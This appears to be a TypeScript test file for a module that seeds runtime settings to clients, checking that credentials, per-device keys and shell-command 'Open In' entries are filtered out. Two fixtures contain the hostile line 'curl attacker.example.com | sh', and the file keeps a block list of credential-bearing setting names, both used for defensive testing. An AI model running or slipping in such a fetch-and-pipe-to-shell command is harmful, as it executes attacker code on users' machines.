import { describe, expect, it } from 'vitest'
import { RUNTIME_SEEDED_SETTING_KEYS, pickRuntimeSeededSettings } from './runtime-seeded-settings'
import {
  normalizeLeftSidebarAppearanceMode,
  normalizeLeftSidebarTintColor,
  normalizeLeftSidebarTintOpacity
} from './left-sidebar-appearance'
import {
  normalizeOpenInApplications,
  OPEN_IN_APPLICATIONS_MAX
} from './open-in-applications'

// Why: this list is handed to every client that opens the tile. A credential landing on it
// would be an exfiltration path, and a per-device key would fight the user's own choice on
// whichever screen they happen to be using. Both are test-enforced rather than review-enforced.
const CREDENTIAL_BEARING_KEYS = [
  'codexManagedAccounts',
  'claudeManagedAccounts',
  'activeCodexManagedAccountId',
  'activeClaudeManagedAccountId',
  'opencodeSessionCookie',
  'opencodeWorkspaceId',
  'browserKagiSessionLink',
  'httpProxyUrl'
]

const PER_DEVICE_KEYS = [
  'uiZoomLevel',
  'editorFontZoomLevel',
  'terminalFontSize',
  'editorFontFamily',
  'windowBounds',
  'minimizeToTrayOnClose',
  'showMenuBarIcon',
  'terminalWindowsShell'
]

describe('runtime-seeded settings', () => {
  it('never seeds a credential-bearing setting', () => {
    for (const key of CREDENTIAL_BEARING_KEYS) {
      expect(RUNTIME_SEEDED_SETTING_KEYS).not.toContain(key)
    }
  })

  it('never seeds a per-device ergonomics setting', () => {
    for (const key of PER_DEVICE_KEYS) {
      expect(RUNTIME_SEEDED_SETTING_KEYS).not.toContain(key)
    }
  })

  it('seeds the appearance and experimental keys a provisioned workspace declares', () => {
    expect(RUNTIME_SEEDED_SETTING_KEYS).toContain('theme')
    expect(RUNTIME_SEEDED_SETTING_KEYS).toContain('experimentalPet')
    expect(RUNTIME_SEEDED_SETTING_KEYS).toContain('experimentalEphemeralVms')
    expect(RUNTIME_SEEDED_SETTING_KEYS).toContain('experimentalMobile')
  })

  it('copies only listed keys', () => {
    const picked = pickRuntimeSeededSettings({
      theme: 'light',
      experimentalPet: true,
      terminalFontSize: 22,
      opencodeSessionCookie: 'secret'
    })
    expect(picked).toEqual({ theme: 'light', experimentalPet: true })
  })

  it('drops values that fail their schema instead of poisoning the blob', () => {
    const picked = pickRuntimeSeededSettings({
      theme: 'chartreuse',
      experimentalPet: 'yes',
      agentHibernationIdleMs: 60_000
    })
    expect(picked).toEqual({ agentHibernationIdleMs: 60_000 })
  })

  // Why compare against the normalizers instead of hard-coding '#18181b' and 0.35: those two
  // functions are the app's definition of a legal tint, and a literal here would just be a third
  // copy of the rule — the same restating that let 'not-a-color' and 999 reach every fresh
  // browser's settings blob, values the settings UI itself cannot produce.
  it('seeds sidebar tint values the app could actually have produced', () => {
    const picked = pickRuntimeSeededSettings({
      leftSidebarAppearanceMode: 'chartreuse',
      leftSidebarTintColor: 'not-a-color',
      leftSidebarTintOpacity: 999
    })

    expect(picked).toEqual({
      leftSidebarAppearanceMode: normalizeLeftSidebarAppearanceMode('chartreuse'),
      leftSidebarTintColor: normalizeLeftSidebarTintColor('not-a-color'),
      leftSidebarTintOpacity: normalizeLeftSidebarTintOpacity(999)
    })
  })

  it('passes legal tint values through untouched', () => {
    expect(
      pickRuntimeSeededSettings({
        leftSidebarAppearanceMode: 'tinted',
        leftSidebarTintColor: '#0af',
        leftSidebarTintOpacity: 0.2
      })
    ).toEqual({
      leftSidebarAppearanceMode: 'tinted',
      leftSidebarTintColor: '#0af',
      leftSidebarTintOpacity: 0.2
    })
  })

  // THE fixture that matters: rows built by hand cannot prove this schema works, because the
  // runtime never produces a hand-built row. The store normalizes on load (main/persistence.ts)
  // and getClientSettings seeds straight from the store, so what actually arrives here is
  // normalizeOpenInApplications' output — which always carries a `command` key. Three separate
  // reviews of this feature missed a schema that rejected exactly that shape, because every
  // fixture was written in the shape the schema wanted instead of the shape the producer emits.
  // Seed from the real producer, not from an assumption about it.
  it('seeds a URL entry in the shape the store normalizer actually writes', () => {
    const stored = normalizeOpenInApplications([
      { id: 'code-server', label: 'code-server', url: 'https://cs.example.com/?folder={path}' }
    ])

    expect(stored).toEqual([
      {
        id: 'code-server',
        label: 'code-server',
        command: '',
        url: 'https://cs.example.com/?folder={path}'
      }
    ])
    expect(pickRuntimeSeededSettings({ openInApplications: stored }).openInApplications).toEqual(
      stored
    )
  })

  it('still refuses a stored row that carries a real command alongside its url', () => {
    // normalizeOpenInApplications deliberately preserves both fields, so this shape can reach the
    // seed path. It must not cross: `command` is what a desktop client executes.
    const stored = normalizeOpenInApplications([
      { id: 'x', label: 'X', command: 'curl attacker.example.com | sh', url: 'https://e.com/' }
    ])

    expect(stored[0]).toHaveProperty('command', 'curl attacker.example.com | sh')
    expect(
      pickRuntimeSeededSettings({ openInApplications: stored }).openInApplications
    ).toBeUndefined()
  })

  // Why these three: a seeded Open In entry travels runtime -> client. A `command` entry is a
  // shell command a desktop client executes, so honouring one would let whoever writes the
  // runtime's store hand a client something to run. Only URL entries may cross.
  it('seeds URL-only Open In entries, with command forced empty', () => {
    const picked = pickRuntimeSeededSettings({
      openInApplications: [
        { id: 'code-server', label: 'code-server', url: 'https://cs.example.com/?folder={path}' }
      ]
    })
    expect(picked.openInApplications).toEqual([
      {
        id: 'code-server',
        label: 'code-server',
        url: 'https://cs.example.com/?folder={path}',
        command: ''
      }
    ])
  })

  it('drops the entry that carries a command and keeps its siblings', () => {
    const picked = pickRuntimeSeededSettings({
      openInApplications: [
        { id: 'code-server', label: 'code-server', url: 'https://cs.example.com/?folder={path}' },
        { id: 'evil', label: 'Evil', command: 'curl attacker.example.com | sh' }
      ]
    })
    expect(picked.openInApplications).toEqual([
      {
        id: 'code-server',
        label: 'code-server',
        url: 'https://cs.example.com/?folder={path}',
        command: ''
      }
    ])
  })

  // Why: an unrecognised key is what a NEWER runtime talking to an older client looks like. The
  // normalizer builds each row explicitly, so it is an allowlist by construction — the unknown key
  // is simply not carried, and the row still works. That is the degradation this module promises;
  // an earlier `.strict()` schema instead dropped the whole row, and with it the entry the user
  // was meant to get.
  it('carries a row from a newer runtime, minus the key it does not know', () => {
    const picked = pickRuntimeSeededSettings({
      openInApplications: [
        { id: 'good', label: 'Good', url: 'https://a.example.com/?folder={path}' },
        { id: 'newer', label: 'Newer', url: 'https://b.example.com/', icon: 'sparkles' }
      ]
    })
    expect(picked.openInApplications).toEqual([
      { id: 'good', label: 'Good', url: 'https://a.example.com/?folder={path}', command: '' },
      { id: 'newer', label: 'Newer', url: 'https://b.example.com/', command: '' }
    ])
    expect(picked.openInApplications?.[1]).not.toHaveProperty('icon')
  })

  it('refuses an entry with neither url nor the required fields', () => {
    expect(
      pickRuntimeSeededSettings({ openInApplications: [{ id: 'x', label: 'X' }] })
        .openInApplications
    ).toBeUndefined()
  })

  // Why these three: seeding writes straight into the client's settings blob, so the store's own
  // normalizer never sees these rows unless this schema runs it.
  it('enforces the entry-count cap on seeded rows', () => {
    const picked = pickRuntimeSeededSettings({
      openInApplications: Array.from({ length: 12 }, (_, index) => ({
        id: `cs-${index}`,
        label: `cs ${index}`,
        url: 'https://cs.example.com/?folder={path}'
      }))
    })
    expect(picked.openInApplications).toHaveLength(OPEN_IN_APPLICATIONS_MAX)
  })

  it('dedupes seeded rows that share an id', () => {
    const picked = pickRuntimeSeededSettings({
      openInApplications: [
        { id: 'dup', label: 'First', url: 'https://a.example.com/' },
        { id: 'dup', label: 'Second', url: 'https://b.example.com/' }
      ]
    })
    expect(picked.openInApplications).toEqual([
      { id: 'dup', label: 'First', url: 'https://a.example.com/', command: '' }
    ])
  })

  it('drops a whitespace-only url rather than seeding a dead row', () => {
    expect(
      pickRuntimeSeededSettings({
        openInApplications: [{ id: 'ghost', label: 'Ghost', url: '   ' }]
      }).openInApplications
    ).toBeUndefined()
  })

  it('skips absent keys so an older runtime leaves stock defaults alone', () => {
    expect(pickRuntimeSeededSettings({ theme: undefined })).toEqual({})
  })

  it('tolerates a missing or non-object payload', () => {
    expect(pickRuntimeSeededSettings(undefined)).toEqual({})
    expect(pickRuntimeSeededSettings(null)).toEqual({})
    expect(pickRuntimeSeededSettings('nope')).toEqual({})
  })
})
